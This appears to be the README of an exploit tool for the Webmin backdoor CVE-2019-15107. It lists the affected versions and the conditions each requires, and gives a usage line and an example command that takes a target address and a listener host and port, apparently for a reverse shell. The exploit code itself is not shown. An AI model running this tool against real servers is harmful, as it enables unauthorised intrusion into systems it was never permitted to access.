# Webmin-CVE-2019-15107

Exploits a backdoor in Webmin servers versions 1.890 through 1.920.

Version 1.890 can be exploited on the default installation.
Versions 1900, 1910, and 1920 require the expired password change feature to be enabled.

TESTED ON 1.920, 1.900 Versions.

Usage: 

python cve201915107.py 'target_ip' 'target_port' 'lhost' 'lport'

Example:

python cve201915107.py 192.168.1.202 10000 192.168.1.100 4444

